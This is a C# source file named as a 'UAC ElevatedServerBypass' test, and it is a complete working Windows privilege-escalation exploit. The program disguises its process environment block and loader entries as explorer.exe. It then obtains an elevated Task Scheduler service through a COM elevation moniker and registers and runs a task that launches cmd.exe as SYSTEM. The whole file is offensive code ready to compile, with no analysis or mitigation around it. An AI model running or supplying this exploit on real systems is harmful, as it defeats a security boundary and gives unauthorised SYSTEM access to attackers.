using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace Zcg.Tests.Windows.UAC.ElevatedServerBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Console.Write("[+] do local patch ...");
                var fake = "explorer.exe";
                var fake2 = @"c:\windows\explorer.exe";
                var PPEB = RtlGetCurrentPeb();
                PEB PEB = (PEB)Marshal.PtrToStructure(PPEB, typeof(PEB));
                bool x86 = Marshal.SizeOf(typeof(IntPtr)) == 4;
                var pImagePathName = new IntPtr(PEB.ProcessParameters.ToInt64() + (x86 ? 0x38 : 0x60));
                var pCommandLine = new IntPtr(PEB.ProcessParameters.ToInt64() + (x86 ? 0x40 : 0x70));
                RtlInitUnicodeString(pImagePathName, fake2);
                RtlInitUnicodeString(pCommandLine, fake2);

                PEB_LDR_DATA PEB_LDR_DATA = (PEB_LDR_DATA)Marshal.PtrToStructure(PEB.Ldr, typeof(PEB_LDR_DATA));
                LDR_DATA_TABLE_ENTRY LDR_DATA_TABLE_ENTRY;
                var pFlink = new IntPtr(PEB_LDR_DATA.InLoadOrderModuleList.Flink.ToInt64());
                var first = pFlink;
                do
                {
                    LDR_DATA_TABLE_ENTRY = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(pFlink, typeof(LDR_DATA_TABLE_ENTRY));
                    if (LDR_DATA_TABLE_ENTRY.FullDllName.Buffer.ToInt64() < 0 || LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer.ToInt64() < 0)
                    {
                        pFlink = LDR_DATA_TABLE_ENTRY.InLoadOrderLinks.Flink;
                        continue;
                    }
                    try
                    {
                        if (Marshal.PtrToStringUni(LDR_DATA_TABLE_ENTRY.FullDllName.Buffer).EndsWith(".exe"))
                        {
                            RtlInitUnicodeString(new IntPtr(pFlink.ToInt64() + (x86 ? 0x24 : 0x48)), fake2);
                            RtlInitUnicodeString(new IntPtr(pFlink.ToInt64() + (x86 ? 0x2c : 0x58)), fake);
                            LDR_DATA_TABLE_ENTRY = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(pFlink, typeof(LDR_DATA_TABLE_ENTRY));
                            break;
                        }
                    }
                    catch { }
                    pFlink = LDR_DATA_TABLE_ENTRY.InLoadOrderLinks.Flink;
                } while (pFlink != first);
                Console.WriteLine("ok!");

                BIND_OPTS3 opt = new BIND_OPTS3();
                opt.cbStruct = (uint)Marshal.SizeOf(opt);
                opt.dwClassContext = 4;

                var srv = CoGetObject("Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}", ref opt, new Guid("{00000000-0000-0000-C000-000000000046}")) as IElevatedFactoryServer;
                Console.WriteLine("[+] create factory: " + srv);
                var svc = srv.ServerCreateElevatedObject(new Guid("{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}"), new Guid("{00000000-0000-0000-C000-000000000046}")) as ITaskService;
                Console.WriteLine("[+] create task service: " + svc);
                svc.Connect();
                var folder = svc.GetFolder("\\");
                var task = folder.RegisterTask("Test Task", xml, 0, null, null, 3, null);
                Console.WriteLine("[+] register task: " + task);
                Console.WriteLine("[+] run task: " + task.Run(null));
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n" + ex);
            }
        }
        [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
        [return: MarshalAs(UnmanagedType.Interface)]
        static extern object CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In, MarshalAs(UnmanagedType.LPStruct)] Guid riid);

        static string xml = @"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.3"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Description>Test Task</Description>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id=""Author"">
      <UserId>SYSTEM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>cmd.exe</Command>
    </Exec>
  </Actions>
</Task>";
        [Guid("804bd226-af47-4d71-b492-443a57610b08")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IElevatedFactoryServer
        {
            [return: MarshalAs(UnmanagedType.Interface)]
            object ServerCreateElevatedObject([In, MarshalAs(UnmanagedType.LPStruct)] Guid rclsid, [In, MarshalAs(UnmanagedType.LPStruct)] Guid riid);
        }

        #region task tiny

        [ComImport, Guid("9C86F320-DEE3-4DD1-B972-A303F26B061E"), InterfaceType(ComInterfaceType.InterfaceIsDual), System.Security.SuppressUnmanagedCodeSecurity, DefaultMember("Path")]
        internal interface IRegisteredTask
        {
            string Name { [return: MarshalAs(UnmanagedType.BStr)] get; }
            string Path { [return: MarshalAs(UnmanagedType.BStr)] get; }
            uint State { get; }
            bool Enabled { get; set; }
            [return: MarshalAs(UnmanagedType.Interface)]
            object Run([In, MarshalAs(UnmanagedType.Struct)] object parameters);
            [return: MarshalAs(UnmanagedType.Interface)]
            object RunEx([In, MarshalAs(UnmanagedType.Struct)] object parameters, [In] int flags, [In] int sessionID, [In, MarshalAs(UnmanagedType.BStr)] string user);
            [return: MarshalAs(UnmanagedType.Interface)]
            object GetInstances(int flags);
            DateTime LastRunTime { get; }
            int LastTaskResult { get; }
            int NumberOfMissedRuns { get; }
            DateTime NextRunTime { get; }
            object Definition { [return: MarshalAs(UnmanagedType.Interface)] get; }
            string Xml { [return: MarshalAs(UnmanagedType.BStr)] get; }
            [return: MarshalAs(UnmanagedType.BStr)]
            string GetSecurityDescriptor(int securityInformation);
            void SetSecurityDescriptor([In, MarshalAs(UnmanagedType.BStr)] string sddl, [In] int flags);
            void Stop(int flags);
        }

        [ComImport, Guid("8CFAC062-A080-4C15-9A88-AA7C2AF80DFC"), InterfaceType(ComInterfaceType.InterfaceIsDual), System.Security.SuppressUnmanagedCodeSecurity, DefaultMember("Path")]
        internal interface ITaskFolder
        {
            string Name { [return: MarshalAs(UnmanagedType.BStr)] get; }
            string Path { [return: MarshalAs(UnmanagedType.BStr)] get; }
            [return: MarshalAs(UnmanagedType.Interface)]
            ITaskFolder GetFolder([MarshalAs(UnmanagedType.BStr)] string Path);
            [return: MarshalAs(UnmanagedType.Interface)]
            object GetFolders(int flags);
            [return: MarshalAs(UnmanagedType.Interface)]
            ITaskFolder CreateFolder();
            void DeleteFolder();
            [return: MarshalAs(UnmanagedType.Interface)]
            IRegisteredTask GetTask();
            [return: MarshalAs(UnmanagedType.Interface)]
            object GetTasks(int flags);
            void DeleteTask();
            [return: MarshalAs(UnmanagedType.Interface)]
            IRegisteredTask RegisterTask([In, MarshalAs(UnmanagedType.BStr)] string Path, [In, MarshalAs(UnmanagedType.BStr)] string XmlText, [In] int flags, [In, MarshalAs(UnmanagedType.Struct)] object UserId, [In, MarshalAs(UnmanagedType.Struct)] object password, [In] int LogonType, [In, Optional, MarshalAs(UnmanagedType.Struct)] object sddl);
            [return: MarshalAs(UnmanagedType.Interface)]
            IRegisteredTask RegisterTaskDefinition();
            [return: MarshalAs(UnmanagedType.BStr)]
            string GetSecurityDescriptor(int securityInformation);
            void SetSecurityDescriptor([In, MarshalAs(UnmanagedType.BStr)] string sddl, [In] int flags);
        }

        [ComImport, DefaultMember("TargetServer"), Guid("2FABA4C7-4DA9-4013-9697-20CC3FD40F85"), System.Security.SuppressUnmanagedCodeSecurity]
        internal interface ITaskService
        {
            [return: MarshalAs(UnmanagedType.Interface)]
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(1)]
            ITaskFolder GetFolder([In, MarshalAs(UnmanagedType.BStr)] string Path);
            [return: MarshalAs(UnmanagedType.Interface)]
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(2)]
            object GetRunningTasks(int flags);
            [return: MarshalAs(UnmanagedType.Interface)]
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(3)]
            object NewTask([In] uint flags);
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(4)]
            void Connect([In, Optional, MarshalAs(UnmanagedType.Struct)] object serverName, [In, Optional, MarshalAs(UnmanagedType.Struct)] object user, [In, Optional, MarshalAs(UnmanagedType.Struct)] object domain, [In, Optional, MarshalAs(UnmanagedType.Struct)] object password);
            [DispId(5)]
            bool Connected { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(5)] get; }
            [DispId(0)]
            string TargetServer { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0)] get; }
            [DispId(6)]
            string ConnectedUser { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(6)] get; }
            [DispId(7)]
            string ConnectedDomain { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(7)] get; }
            [DispId(8)]
            uint HighestVersion { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(8)] get; }
        }

        #endregion

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct PEB
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public Byte[] Reserved1;
            public Byte BeingDebugged;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public Byte[] Reserved2;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public IntPtr[] Reserved3;
            public IntPtr Ldr;
            public IntPtr ProcessParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
            public IntPtr[] Reserved4;
            public IntPtr AtlThunkSListPtr;
            public IntPtr Reserved5;
            public ulong Reserved6;
            public IntPtr Reserved7;
            public ulong Reserved8;
            public ulong AtlThunkSListPtr32;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 45)]
            public IntPtr[] Reserved9;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public Byte[] Reserved10;
            public IntPtr PostProcessInitRoutine;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]
            public Byte[] Reserved11;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public IntPtr[] Reserved12;
            public ulong SessionId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct RTL_USER_PROCESS_PARAMETERS
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public Byte[] Reserved1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public IntPtr[] Reserved2;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct PEB_LDR_DATA
        {
            public UInt32 Length;
            public UInt32 Initialized;
            public UInt64 SsHandleIntPtr;
            public LIST_ENTRY InLoadOrderModuleList;
            public LIST_ENTRY InMemoryOrderModuleList;
            public LIST_ENTRY InInitializationOrderModuleList;
            public IntPtr EntryInProgress;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public LIST_ENTRY InLoadOrderLinks;
            public LIST_ENTRY InMemoryOrderLinks;
            public LIST_ENTRY InInitializationOrderLinks;
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public IntPtr SizeOfImage;
            public UNICODE_STRING FullDllName;
            public UNICODE_STRING BaseDllName;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct BIND_OPTS3
        {
            public UInt32 cbStruct;
            public UInt32 grfFlags;
            public UInt32 grfMode;
            public UInt32 dwTickCountDeadline;
            public UInt32 dwTrackFlags;
            public UInt32 dwClassContext;
            public UInt32 locale;
            public IntPtr pServerInfo;
            public IntPtr hwnd;
        }
        [DllImport("ntdll.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr RtlGetCurrentPeb();
        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern void RtlInitUnicodeString(IntPtr desc, string str);
    }
}